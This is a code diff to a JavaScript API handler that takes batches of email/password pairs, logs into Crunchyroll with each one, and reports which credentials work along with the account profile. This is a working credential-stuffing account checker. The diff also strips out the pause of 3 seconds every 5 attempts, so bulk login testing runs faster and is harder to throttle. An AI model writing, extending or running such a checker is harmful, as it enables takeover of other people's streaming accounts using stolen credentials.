@@ -18,27 +18,25 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
+  
   const { accounts = [], region } = req.body || {};
+  
+  // Support both single account and batch mode
   if (!Array.isArray(accounts) || accounts.length === 0) {
     return res.status(400).json({ error: 'No accounts specified' });
   }
-  const results = [];
-  let count = 0;
-  for (const acc of accounts) {
-    const { email, password } = acc;
+  
+  // If only one account, check it directly
+  if (accounts.length === 1) {
+    const { email, password } = accounts[0];
     if (!email || !password) {
-      results.push({ ...acc, ok: false, error: 'Invalid account format' });
-      count++;
-      // Pause after every 5 attempts
-      if (count % 5 === 0 && count < accounts.length) {
-        await new Promise((resolve) => setTimeout(resolve, 3000));
-      }
-      continue;
+      return res.status(200).json({ results: [{ email, password, ok: false, error: 'Invalid account format' }] });
     }
+    
     try {
-      // Dynamic import to get a fresh module instance
-      const crModule = await import('crunchyroll.js');
-      const cr = crModule.default || crModule;
+      // Use require to force fresh module load
+      delete require.cache[require.resolve('crunchyroll.js')];
+      const cr = require('crunchyroll.js');
       
       await cr.login(email, password, region || undefined);
       const profile = await cr.getProfile();
@@ -54,19 +52,48 @@ export default async function handler(req, res) {
       
       // When the profile contains an error code we treat it as invalid
       if (profile && typeof profile === 'object' && profile.code) {
+        return res.status(200).json({ results: [{ email, password, ok: false, errorCode: profile.code, error: profile.code }] });
+      } else {
+        return res.status(200).json({ results: [{ email, password, ok: true, profile }] });
+      }
+    } catch (err) {
+      return res.status(200).json({ results: [{ email, password, ok: false, errorCode: err?.code, error: err?.message || String(err) }] });
+    }
+  }
+  
+  // Batch mode - not recommended due to session conflicts
+  const results = [];
+  for (const acc of accounts) {
+    const { email, password } = acc;
+    if (!email || !password) {
+      results.push({ email, password, ok: false, error: 'Invalid account format' });
+      continue;
+    }
+    
+    try {
+      delete require.cache[require.resolve('crunchyroll.js')];
+      const cr = require('crunchyroll.js');
+      
+      await cr.login(email, password, region || undefined);
+      const profile = await cr.getProfile();
+      
+      try {
+        if (typeof cr.logout === 'function') {
+          await cr.logout();
+        }
+      } catch (logoutErr) {
+        // Ignore
+      }
+      
+      if (profile && typeof profile === 'object' && profile.code) {
         results.push({ email, password, ok: false, errorCode: profile.code, error: profile.code });
       } else {
         results.push({ email, password, ok: true, profile });
       }
     } catch (err) {
-      // Some errors may have a code property
       results.push({ email, password, ok: false, errorCode: err?.code, error: err?.message || String(err) });
     }
-    count++;
-    // Pause after every 5 successful/unsuccessful attempts except after last
-    if (count % 5 === 0 && count < accounts.length) {
-      await new Promise((resolve) => setTimeout(resolve, 3000));
-    }
   }
+  
   return res.status(200).json({ results });
 }
